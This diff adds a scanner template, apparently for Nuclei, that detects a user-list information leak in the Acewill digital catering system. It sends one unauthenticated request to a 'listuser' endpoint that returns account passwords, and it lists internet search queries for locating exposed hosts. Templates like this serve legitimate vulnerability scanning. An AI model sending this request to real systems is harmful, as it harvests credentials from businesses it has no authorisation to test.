@@ -1,0 +1,32 @@
+id: Acewill_Digital_catering_Info_leakage
+
+info:
+  name: Acewill_Digital_catering_Info_leakage
+  author: security-xm
+  severity: medium
+  description: 喰星云-数字化餐饮服务系统listuser信息泄露漏洞(账号密码)
+  metadata:
+    max-request: 1
+    Fofa-query: body="tmp_md5_pwd"
+    Quake-query: body="tmp_md5_pwd"
+    Hunter-query: body="tmp_md5_pwd"
+    verified: true
+
+http:
+  - raw:
+    - |+
+      @timeout: 30s
+      GET /chainsales/head/user/listuser HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+      Accept-Encoding: gzip, deflate
+      Accept: */*
+      Connection: keep-alive
+
+    max-redirects: 3
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+        - pwd
